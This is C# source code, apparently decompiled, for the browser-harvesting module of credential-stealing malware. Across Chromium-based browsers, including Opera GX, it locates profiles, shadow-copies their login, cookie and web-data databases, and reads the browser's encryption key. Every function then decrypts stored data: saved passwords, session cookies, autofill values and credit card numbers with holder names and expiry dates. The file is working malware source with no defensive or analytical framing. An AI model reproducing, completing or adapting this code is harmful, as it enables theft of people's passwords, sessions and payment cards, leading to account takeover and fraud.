using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

// Token: 0x02000002 RID: 2
public static class Chr_0_M_e
{
	// Token: 0x06000001 RID: 1 RVA: 0x000043AC File Offset: 0x000025AC
	public static List<Browser> Scan(IList<string> profiles)
	{
		List<Browser> list = new List<Browser>();
		try
		{
			foreach (string baseDirectory in from x in profiles
			select Environment.ExpandEnvironmentVariables(x))
			{
				foreach (string text in FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}))
				{
					Browser browser = new Browser();
					string dataFolder = string.Empty;
					string text2 = string.Empty;
					try
					{
						dataFolder = new FileInfo(text).Directory.FullName;
						if (dataFolder.Contains("Opera GX Stable"))
						{
							text2 = "Opera GX";
						}
						else
						{
							text2 = (text.Contains("AppData\\Roaming\\") ? FileCopier.ChromeGetRoamingName(dataFolder) : FileCopier.ChromeGetLocalName(dataFolder));
						}
						if (!string.IsNullOrEmpty(text2))
						{
							text2 = text2[0].ToString().ToUpper() + text2.Remove(0, 1);
							string text3 = FileCopier.ChromeGetName(dataFolder);
							if (!string.IsNullOrEmpty(text3))
							{
								browser.BrowserName = text2;
								browser.BrowserProfile = text3;
								browser.Logins = Chr_0_M_e.MakeTries<List<Account>>(() => Chr_0_M_e.ScanPasswords(dataFolder), (List<Account> x) => x.Count > 0);
								browser.Cookies = Chr_0_M_e.MakeTries<List<ScannedCookie>>(() => Chr_0_M_e.ScanCook(dataFolder), (List<ScannedCookie> x) => x.Count > 0);
								browser.Autofills = Chr_0_M_e.MakeTries<List<Autofill>>(() => Chr_0_M_e.ScanFills(dataFolder), (List<Autofill> x) => x.Count > 0);
								browser.CC = Chr_0_M_e.MakeTries<List<CC>>(() => Chr_0_M_e.ScanCC(dataFolder), (List<CC> x) => x.Count > 0);
							}
						}
					}
					catch (Exception)
					{
					}
					if (!browser.IsEmpty())
					{
						list.Add(browser);
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	private static List<Account> ScanPasswords(string profilePath)
	{
		List<Account> list = new List<Account>();
		try
		{
			string text = Path.Combine(profilePath, "Login Data");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			using FileCopier fileCopier = new FileCopier();
			try
			{
				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
				dbFactory.ReadContextTable("logins");
				for (int i = 0; i < dbFactory.RowLength; i++)
				{
					Account account = new Account();
					try
					{
						account.URL = dbFactory.ReadContextValue(i, 0).Trim();
						account.Username = dbFactory.ReadContextValue(i, 3).Trim();
						account.Password = DecryptChromium(dbFactory.ReadContextValue(i, 5), chromeKey);
					}
					catch (Exception)
					{
					}
					finally
					{
						account.URL = (string.IsNullOrWhiteSpace(account.URL) ? "UNKNOWN" : account.URL);
						account.Username = (string.IsNullOrWhiteSpace(account.Username) ? "UNKNOWN" : account.Username);
						account.Password = (string.IsNullOrWhiteSpace(account.Password) ? "UNKNOWN" : account.Password);
					}
					if (account.Password != "UNKNOWN")
					{
						list.Add(account);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<ScannedCookie> ScanCook(string profilePath)
	{
		List<ScannedCookie> list = new List<ScannedCookie>();
		try
		{
			string text = Path.Combine(profilePath, "Cookies");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			using FileCopier fileCopier = new FileCopier();
			try
			{
				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
				dbFactory.ReadContextTable("cookies");
				for (int i = 0; i < dbFactory.RowLength; i++)
				{
					ScannedCookie scannedCookie = null;
					try
					{
						ScannedCookie scannedCookie2 = new ScannedCookie();
						scannedCookie2.Host = dbFactory.GatherValue(i, "host_key").Trim();
						scannedCookie2.Http = dbFactory.GatherValue(i, "host_key").Trim().StartsWith(".");
						scannedCookie2.Path = dbFactory.GatherValue(i, "path").Trim();
						scannedCookie2.Secure = dbFactory.GatherValue(i, "is_secure").Contains("1");
						scannedCookie2.Expires = Convert.ToInt64(dbFactory.GatherValue(i, "expires_utc").Trim()) / 1000000 - 11644473600L;
						scannedCookie2.Name = dbFactory.GatherValue(i, "name").Trim();
						scannedCookie2.Value = DecryptChromium(dbFactory.GatherValue(i, "encrypted_value"), chromeKey);
						scannedCookie = scannedCookie2;
						if (scannedCookie.Expires < 0)
						{
							scannedCookie.Expires = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
						}
					}
					catch
					{
					}
					if (!string.IsNullOrWhiteSpace(scannedCookie?.Value))
					{
						list.Add(scannedCookie);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<Autofill> ScanFills(string profilePath)
	{
		List<Autofill> list = new List<Autofill>();
		try
		{
			string text = Path.Combine(profilePath, "Web Data");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			using FileCopier fileCopier = new FileCopier();
			try
			{
				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
				dbFactory.ReadContextTable("autofill");
				for (int i = 0; i < dbFactory.RowLength; i++)
				{
					Autofill autofill = null;
					try
					{
						string text2 = dbFactory.GatherValue(i, "value").Trim();
						if (text2.StartsWith("v10") || text2.StartsWith("v11"))
						{
							text2 = DecryptChromium(text2, chromeKey);
						}
						Autofill autofill2 = new Autofill();
						autofill2.Name = dbFactory.GatherValue(i, "name").Trim();
						autofill2.Value = text2;
						autofill = autofill2;
					}
					catch
					{
					}
					if (autofill != null)
					{
						list.Add(autofill);
					}
				}
				return list;
			}
			catch (Exception)
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static List<CC> ScanCC(string profilePath)
	{
		List<CC> list = new List<CC>();
		try
		{
			string text = Path.Combine(profilePath, "Web Data");
			if (!File.Exists(text))
			{
				return list;
			}
			string chromeKey = ReadKey(profilePath);
			using FileCopier fileCopier = new FileCopier();
			try
			{
				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
				dbFactory.ReadContextTable("credit_cards");
				for (int i = 0; i < dbFactory.RowLength; i++)
				{
					CC cC = null;
					try
					{
						string number = DecryptChromium(dbFactory.GatherValue(i, "card_number_encrypted"), chromeKey).Replace(" ", string.Empty);
						CC cC2 = new CC();
						cC2.HolderName = dbFactory.GatherValue(i, "name_on_card").Trim();
						cC2.Month = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_month").Trim());
						cC2.Year = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_year").Trim());
						cC2.Number = number;
						cC = cC2;
					}
					catch
					{
					}
					if (cC != null)
					{
						list.Add(cC);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	private static string DecryptChromium(string chiperText, string chromeKey)
	{
		string result = string.Empty;
		try
		{
			if (chiperText[0] == 'v' && chiperText[1] == '1')
			{
				result = CryptoProvider.Decrypt(Convert.FromBase64String(chromeKey), chiperText);
				return result;
			}
			result = CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser).Trim();
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
	{
		int num = 1;
		T val = func();
		while (!success(val))
		{
			val = func();
			num++;
			if (num > 2)
			{
				return val;
			}
		}
		return val;
	}

	private static string ReadKey(string profilePath)
	{
		string result = string.Empty;
		string empty = string.Empty;
		try
		{
			string[] array = profilePath.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
			array = array.Take(array.Length - 1).ToArray();
			int num = 0;
			while (true)
			{
				switch (num)
				{
				default:
					continue;
				case 0:
					empty = Path.Combine(string.Join("\\", array), "Local State");
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 1:
					empty = Path.Combine(profilePath, "Local State");
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 2:
					empty = Path.Combine(string.Join("\\", array), "LocalPrefs.json");
					if (!File.Exists(empty))
					{
						num++;
						continue;
					}
					break;
				case 3:
					empty = Path.Combine(profilePath, "LocalPrefs.json");
					break;
				}
				break;
			}
			if (File.Exists(empty))
			{
				try
				{
					using (new FileCopier())
					{
						result = File.ReadAllText(empty).FromJSON<LocalState>().os_crypt.encrypted_key;
						return result;
					}
				}
				catch (Exception)
				{
					return result;
				}
			}
			return result;
		}
		catch
		{
			return result;
		}
	}
}
